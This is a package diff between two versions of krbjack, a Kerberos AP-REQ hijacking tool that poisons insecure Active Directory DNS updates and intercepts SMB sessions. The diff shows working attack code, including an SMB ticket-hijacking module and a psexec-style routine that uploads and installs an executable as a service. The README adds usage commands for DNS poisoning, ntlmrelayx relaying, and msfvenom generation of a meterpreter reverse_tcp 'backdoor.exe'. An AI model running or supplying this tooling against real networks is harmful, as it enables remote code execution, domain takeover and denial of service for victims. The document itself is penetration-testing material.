# Comparing `tmp/krbjack-1.0.2.tar.gz` & `tmp/krbjack-1.1.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "krbjack-1.0.2.tar", max compression
+gzip compressed data, was "krbjack-1.1.0.tar", max compression
```

## Comparing `krbjack-1.0.2.tar` & `krbjack-1.1.0.tar`

### file list

```diff
@@ -1,13 +1,13 @@
--rw-r--r--   0        0        0        0 2023-04-16 10:50:40.975309 krbjack-1.0.2/krbjack/__init__.py
--rw-r--r--   0        0        0     4844 2023-04-20 21:06:41.754965 krbjack-1.0.2/krbjack/__main__.py
--rw-r--r--   0        0        0     3349 2023-04-16 10:50:33.382821 krbjack-1.0.2/krbjack/custompipes.py
--rw-r--r--   0        0        0    10478 2023-04-20 20:56:42.382098 krbjack-1.0.2/krbjack/krbjacker.py
--rw-r--r--   0        0        0        0 2023-04-16 10:50:53.310403 krbjack-1.0.2/krbjack/modules/__init__.py
--rw-r--r--   0        0        0     7373 2023-04-20 21:12:00.797143 krbjack-1.0.2/krbjack/modules/psexec.py
--rw-r--r--   0        0        0     1784 2023-04-16 10:50:46.295130 krbjack-1.0.2/krbjack/modules/utils.py
--rw-r--r--   0        0        0     6012 2023-05-01 14:46:37.582796 krbjack-1.0.2/krbjack/tcpforward.py
--rw-r--r--   0        0        0     1485 2023-04-16 10:50:21.132287 krbjack-1.0.2/krbjack/utils.py
--rw-r--r--   0        0        0      446 2023-04-16 10:50:04.426169 krbjack-1.0.2/LICENSE
--rw-r--r--   0        0        0      649 2023-05-01 14:46:52.197256 krbjack-1.0.2/pyproject.toml
--rw-r--r--   0        0        0     9014 2023-05-01 14:43:55.625654 krbjack-1.0.2/README.md
--rw-r--r--   0        0        0     9877 1970-01-01 00:00:00.000000 krbjack-1.0.2/PKG-INFO
+-rw-r--r--   0        0        0        0 2023-04-16 10:50:40.975309 krbjack-1.1.0/krbjack/__init__.py
+-rw-r--r--   0        0        0     4863 2023-05-21 14:41:56.871712 krbjack-1.1.0/krbjack/__main__.py
+-rw-r--r--   0        0        0     3349 2023-04-16 10:50:33.382821 krbjack-1.1.0/krbjack/custompipes.py
+-rw-r--r--   0        0        0    10478 2023-05-21 14:43:40.080017 krbjack-1.1.0/krbjack/krbjacker.py
+-rw-r--r--   0        0        0        0 2023-04-16 10:50:53.310403 krbjack-1.1.0/krbjack/modules/__init__.py
+-rw-r--r--   0        0        0     5443 2023-05-21 14:51:34.821328 krbjack-1.1.0/krbjack/modules/krboversmb.py
+-rw-r--r--   0        0        0     3672 2023-05-20 16:28:55.707049 krbjack-1.1.0/krbjack/modules/utils.py
+-rw-r--r--   0        0        0     6012 2023-05-20 16:17:25.824247 krbjack-1.1.0/krbjack/tcpforward.py
+-rw-r--r--   0        0        0     1485 2023-04-16 10:50:21.132287 krbjack-1.1.0/krbjack/utils.py
+-rw-r--r--   0        0        0      446 2023-04-16 10:50:04.426169 krbjack-1.1.0/LICENSE
+-rw-r--r--   0        0        0      649 2023-05-21 14:59:10.350852 krbjack-1.1.0/pyproject.toml
+-rw-r--r--   0        0        0     9879 2023-05-21 14:58:02.492337 krbjack-1.1.0/README.md
+-rw-r--r--   0        0        0    10742 1970-01-01 00:00:00.000000 krbjack-1.1.0/PKG-INFO
```

### Comparing `krbjack-1.0.2/krbjack/__main__.py` & `krbjack-1.1.0/krbjack/__main__.py`

 * *Files 4% similar despite different names*

```diff
@@ -62,33 +62,33 @@
     )
     parser.add_argument(
         "--dc-ip", type=IPv4Address, required=True,
         help="The IP address of the domain controller we want to talk to to perform DNS records"
              " poisoning"
     )
     parser.add_argument(
-        "--ports", action=SplitIntArgs, required=True,
+        "--ports", action=SplitIntArgs, required=False, default=[],
         help="List of TCP ports to forward from the incoming clients to the attacked system."
              " Comma-separated port numbers. Example : 139,445,8080."
     )
     parser.add_argument(
-        "--executable", type=pathlib.Path, required=True,
+        "--executable", type=pathlib.Path, required=False,
         help=(
             "The executable to push and execute to the remote target. "
             "Can be generated with msfvenom type exe-service. "
             "Example : msfvenom -p windows/x64/meterpreter/reverse_tcp "
             "-f exe-service -o backdoor.exe LHOST=X LPORT=Y. If the executable"
             " is not a service executable, it will still work, though the process"
             " will be killed after a few seconds by windows if it takes too long to"
             " run."
         )
     )
-    # Feeling to lazy to implement automatic module detection, they must be listed here
+    # Feeling too lazy to implement automatic module detection, they must be listed here
     # for the time being.
-    modules = ["psexec"]
+    modules = ["krboversmb"]
 
     args = parser.parse_args()
     colorama_init()
     jacker = KrbJacker(args, modules)
     try:
         jacker.run()  # Stops when target owned
         for m in jacker.running_modules:
```

### Comparing `krbjack-1.0.2/krbjack/custompipes.py` & `krbjack-1.1.0/krbjack/custompipes.py`

 * *Files identical despite different names*

### Comparing `krbjack-1.0.2/krbjack/krbjacker.py` & `krbjack-1.1.0/krbjack/krbjacker.py`

 * *Files identical despite different names*

### Comparing `krbjack-1.0.2/krbjack/modules/psexec.py` & `krbjack-1.1.0/krbjack/modules/krboversmb.py`

 * *Files 17% similar despite different names*

```diff
@@ -1,16 +1,12 @@
 from scapy.layers.smb2 import SMB2_Header, SMB2_Session_Setup_Request
+from krbjack.modules.utils import HomeBackedPSEXEC
 from impacket.smbconnection import SessionError
 from scapy.layers.kerberos import KRB_AP_REQ
 from scapy.layers.gssapi import SPNEGO_Token
-from impacket.examples import serviceinstall
-from impacket.dcerpc.v5 import transport
-from uuid import uuid4
-import logging
-import sys
 
 from .utils import getAuthenticatedImpacketSMBConnection
 
 """
 This module is made to catch AP_REQ on the fly in SMB connections from clients to the
 destination target. When AP_REQ is received, it checks if it belongs to a privileged
 user on the target. If it is the case, the ticket is used directly to push the chosen
@@ -67,15 +63,17 @@
     #   the_packet : the interesting packet
     # must return a bool stating wether or not the attack is successful.
     #   True/successful -> the entire program exits, DNS is set back to normal, forwarding is
     #       stopped ;
     #   False/unsuccessful -> forwarding is set up again, the client is added to
     #       the whitelist of clients not to inspect traffic from.
     def run(self, jacker, client_ip, the_packet):
-        print("=== PSEXEC module ===")
+        if jacker.args.executable is None:
+            return False
+        print("=== KRB hijacking module ===")
         pkt = SMB2_Header(the_packet[4:])
         # Fetch the AP_REQ
         apreq = (
             pkt[SMB2_Session_Setup_Request].Buffer[0][1][SPNEGO_Token]
             .value.root.innerContextToken.root
         )
         # Display the realm and SPN for the ST
@@ -97,15 +95,15 @@
         # Checking if the user will be able to psexec
         print("\tNow let's see if this ticket belongs to a privileged user ...")
         try:
             connection.listPath("ADMIN$", "/*")
             print("\t=== Admin connection set up !!!")
             print("\t=== Launching home-baked/modified psexec ...")
             # Runs our modified/simpler psexec
-            executer = __class__.HomeBackedPSEXEC(jacker.args.executable)
+            executer = HomeBackedPSEXEC(jacker.args.executable)
             self.service = executer.run(connection)
             if self.service is not None:
                 print("\tService installed and running !")
                 return True
             else:
                 return False
         except SessionError:
@@ -113,50 +111,7 @@
 
     # This method can be used to clean stuff. It is called if necessary as defined in
     # this class "requires_cleaning" attribute
     def cleanup(self):
         if self.service is not None:
             print("\tUninstalling service ...")
             self.service.uninstall()
-
-    # Our home made psexec. It is basically much simpler that the impacket one
-    # because we dont need to perform any sort of authentication, and because
-    # we dont care to get it interactive.
-    # It can be set up from a custom SMBConnection though, what we need here to
-    # run it from a hijacked SMB connection obtained through scapy !
-    class HomeBackedPSEXEC:
-        def __init__(self, exeFile):
-            self.__exeFile = exeFile
-            self.__serviceName = str(uuid4())
-
-        def run(self, connection):
-            print("\tHijacking SMB session for DCE transport ...")
-            rpctransport = transport.SMBTransport(remoteName=connection.getRemoteName())
-            rpctransport.set_smb_connection(connection)
-            return self.doStuff(rpctransport)
-
-        def doStuff(self, rpctransport):
-            # Sets up the DCE/RPC connection through SMB
-            dce = rpctransport.get_dce_rpc()
-            try:
-                dce.connect()
-            except Exception as e:
-                if logging.getLogger().level == logging.DEBUG:
-                    import traceback
-                    traceback.print_exc()
-                logging.critical(str(e))
-                sys.exit(1)
-            global dialect
-            dialect = rpctransport.get_smb_connection().getDialect()
-            # Copy, install and run the service
-            f = open(self.__exeFile, 'rb')
-            installService = serviceinstall.ServiceInstall(
-                rpctransport.get_smb_connection(), f, self.__serviceName
-            )
-            print(f"\tInstalling service {self.__serviceName}")
-            if installService.install() is False:
-                f.close()
-                print("\tService installation error :-(")
-                return None
-            f.close()
-            # Returns the service to be able to uninstall it later
-            return installService
```

### Comparing `krbjack-1.0.2/krbjack/tcpforward.py` & `krbjack-1.1.0/krbjack/tcpforward.py`

 * *Files identical despite different names*

### Comparing `krbjack-1.0.2/krbjack/utils.py` & `krbjack-1.1.0/krbjack/utils.py`

 * *Files identical despite different names*

### Comparing `krbjack-1.0.2/pyproject.toml` & `krbjack-1.1.0/pyproject.toml`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 [tool.poetry]
 name = "krbjack"
-version = "1.0.2"
+version = "1.1.0"
 description = "Kerberos AP-REQ hijacking tool with DNS unsecure updates abuse."
 authors = ["Virgile Jarry <virgile@mailbox.org>"]
 readme = "README.md"
 license = "Beerware"
 homepage = "https://github.com/almandin/krbjack"
 repository = "https://github.com/almandin/krbjack"
 documentation = "https://github.com/almandin/krbjack/README.md"
```

### Comparing `krbjack-1.0.2/README.md` & `krbjack-1.1.0/README.md`

 * *Files 5% similar despite different names*

```diff
@@ -21,28 +21,34 @@
 
 `sudo krbjack --target-name <targetNBTName> [--target-ip <targetIP>] --domain <domainName> --dc-ip <domainControlerIpAddress> --ports <port1,port2,port3,...> --executable <executable.exe>`
 
 - `--target-name` : The netbios name of your target, the one you will impersonate, the one you want will pwn if successful. Example : `winserv2`;
 - `--target-ip` : You might want to specify the IP address of your target. The alternative is to let this tool query the DNS to get its IP addresses. A quick naive scan is performed to choose one IP from the ones returned by the DNS though this method is flawed. Example: `192.168.42.20`;
 - `--domain` : The domain name to which your target is joined. Example : `windomain.local`;
 - `--dc-ip` : The IP address of the domain controller you will be poisoning DNS records. Can be any domain controller as the DNS zones will be replicated automatically. Example : `192.168.42.10`;
-- `--ports` : A list of TCP ports which will be open on your attacker's machine to forward traffic to your target. This list is *very* important because if you omit one port which is open on the legitimate service (your target), clients wont be able to access it during the time of the attack. Setting this list of ports correctly is the key to perform the attack without doing to much of a mess in the network. Example : `135,139,445,80,443,8080`
-- `--executable <executable.exe>` : The path to an executable on your attacker's machine. This executable will be uploaded and executed psexec-style on your target if the attack succeeds. Example : `/home/almandin/metx64revtcp.exe`.
+- `--ports` : An optional list of TCP ports which will be open on your attacker's machine to forward traffic to your target. This list is *very* important because if you omit one port which is open on the legitimate service (your target), clients wont be able to access it during the time of the attack. Setting this list of ports correctly is the key to perform the attack without doing to much of a mess in the network. Example : `135,139,445,80,443,8080`
+- `--executable <executable.exe>` : An optional path to an executable on your attacker's machine. This executable will be uploaded and executed psexec-style on your target if the attack succeeds. Example : `/home/almandin/metx64revtcp.exe`.
 
     The executable you provide can be either a "standard" executable, or a windows service executable (better). If it is a "standard" executable, windows will kill it when running after a few seconds if it has not ended already, because as it is run as a service, Windows expects it to do proper signaling (behave as a true service). Though it still works, you might want to migrate quickly your meterpreter when the session is established.
 
     If you use a windows service executable, you're good to go, nothing to add here. You can generate such executables with msfvenom with the `exe-service` format:
 
         msfvenom -f exe-service -o backdoor.exe -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y
 
 **Additionnal flags :**
 
 - `--check` : Used to performs no attack at all, just to check if the DNS zone is vulnerable.
 - `--no-poison` : Can  be used to set all the mess in place but prevent DNS poisoning from being done. Just in case you managed to poison DNS yourself or if you found another way to point clients to you instead of the legitimate service.
 
+## Alternative use cases
+
+You can use krbjack to only poison dns records, or in combination to ntlmrelayx as well. If you do not specify any executable, no remote code execution will be performed, only dns poisonning will be performed. You can use this and specify ports to forward to catch traffic between your target and any system that tries to reach it by DNS name.
+
+If you do not provide any ports, no tcp forwarding will be performed. This enables to use ntlmrelayx with an unsecure dns update abuse. Example : `krbjack --target-name winserv --domain windomain.local --dc-ip 10.0.0.1`. This will start dns poisonning. At the same time you can start ntlmrelayx : `ntlmrelayx.py -t 10.0.0.42 -smb2support` to try to execute code to the 10.0.0.42 machine. Note that without any tcp forwarding enabled, a full denial of service is performed...
+
 ## What are the requirements for this to work ?
 
 First you need to check if the domain you are testing is vulnerable to the main misconfiguration : `ZONE_UPDATE_UNSECURE`. For this you can use external tools such as PingCastle, or let Krbjack do it with the addition of the `--check` flag on the command line.
 
 At the moment this tool only works for systems that do not require SMB Signing. This is a current limitation as the exploited service is SMB for the time being. It means that you cannot target domain controllers most of the time as they have been requiring SMB signing by default for a long time.
 
 ## What are the risks of using this tool ?
```

### Comparing `krbjack-1.0.2/PKG-INFO` & `krbjack-1.1.0/PKG-INFO`

 * *Files 5% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: krbjack
-Version: 1.0.2
+Version: 1.1.0
 Summary: Kerberos AP-REQ hijacking tool with DNS unsecure updates abuse.
 Home-page: https://github.com/almandin/krbjack
 License: Beerware
 Author: Virgile Jarry
 Author-email: virgile@mailbox.org
 Requires-Python: >=3.9,<4.0
 Classifier: License :: Other/Proprietary License
@@ -43,28 +43,34 @@
 
 `sudo krbjack --target-name <targetNBTName> [--target-ip <targetIP>] --domain <domainName> --dc-ip <domainControlerIpAddress> --ports <port1,port2,port3,...> --executable <executable.exe>`
 
 - `--target-name` : The netbios name of your target, the one you will impersonate, the one you want will pwn if successful. Example : `winserv2`;
 - `--target-ip` : You might want to specify the IP address of your target. The alternative is to let this tool query the DNS to get its IP addresses. A quick naive scan is performed to choose one IP from the ones returned by the DNS though this method is flawed. Example: `192.168.42.20`;
 - `--domain` : The domain name to which your target is joined. Example : `windomain.local`;
 - `--dc-ip` : The IP address of the domain controller you will be poisoning DNS records. Can be any domain controller as the DNS zones will be replicated automatically. Example : `192.168.42.10`;
-- `--ports` : A list of TCP ports which will be open on your attacker's machine to forward traffic to your target. This list is *very* important because if you omit one port which is open on the legitimate service (your target), clients wont be able to access it during the time of the attack. Setting this list of ports correctly is the key to perform the attack without doing to much of a mess in the network. Example : `135,139,445,80,443,8080`
-- `--executable <executable.exe>` : The path to an executable on your attacker's machine. This executable will be uploaded and executed psexec-style on your target if the attack succeeds. Example : `/home/almandin/metx64revtcp.exe`.
+- `--ports` : An optional list of TCP ports which will be open on your attacker's machine to forward traffic to your target. This list is *very* important because if you omit one port which is open on the legitimate service (your target), clients wont be able to access it during the time of the attack. Setting this list of ports correctly is the key to perform the attack without doing to much of a mess in the network. Example : `135,139,445,80,443,8080`
+- `--executable <executable.exe>` : An optional path to an executable on your attacker's machine. This executable will be uploaded and executed psexec-style on your target if the attack succeeds. Example : `/home/almandin/metx64revtcp.exe`.
 
     The executable you provide can be either a "standard" executable, or a windows service executable (better). If it is a "standard" executable, windows will kill it when running after a few seconds if it has not ended already, because as it is run as a service, Windows expects it to do proper signaling (behave as a true service). Though it still works, you might want to migrate quickly your meterpreter when the session is established.
 
     If you use a windows service executable, you're good to go, nothing to add here. You can generate such executables with msfvenom with the `exe-service` format:
 
         msfvenom -f exe-service -o backdoor.exe -p windows/x64/meterpreter/reverse_tcp LHOST=X LPORT=Y
 
 **Additionnal flags :**
 
 - `--check` : Used to performs no attack at all, just to check if the DNS zone is vulnerable.
 - `--no-poison` : Can  be used to set all the mess in place but prevent DNS poisoning from being done. Just in case you managed to poison DNS yourself or if you found another way to point clients to you instead of the legitimate service.
 
+## Alternative use cases
+
+You can use krbjack to only poison dns records, or in combination to ntlmrelayx as well. If you do not specify any executable, no remote code execution will be performed, only dns poisonning will be performed. You can use this and specify ports to forward to catch traffic between your target and any system that tries to reach it by DNS name.
+
+If you do not provide any ports, no tcp forwarding will be performed. This enables to use ntlmrelayx with an unsecure dns update abuse. Example : `krbjack --target-name winserv --domain windomain.local --dc-ip 10.0.0.1`. This will start dns poisonning. At the same time you can start ntlmrelayx : `ntlmrelayx.py -t 10.0.0.42 -smb2support` to try to execute code to the 10.0.0.42 machine. Note that without any tcp forwarding enabled, a full denial of service is performed...
+
 ## What are the requirements for this to work ?
 
 First you need to check if the domain you are testing is vulnerable to the main misconfiguration : `ZONE_UPDATE_UNSECURE`. For this you can use external tools such as PingCastle, or let Krbjack do it with the addition of the `--check` flag on the command line.
 
 At the moment this tool only works for systems that do not require SMB Signing. This is a current limitation as the exploited service is SMB for the time being. It means that you cannot target domain controllers most of the time as they have been requiring SMB signing by default for a long time.
 
 ## What are the risks of using this tool ?
```

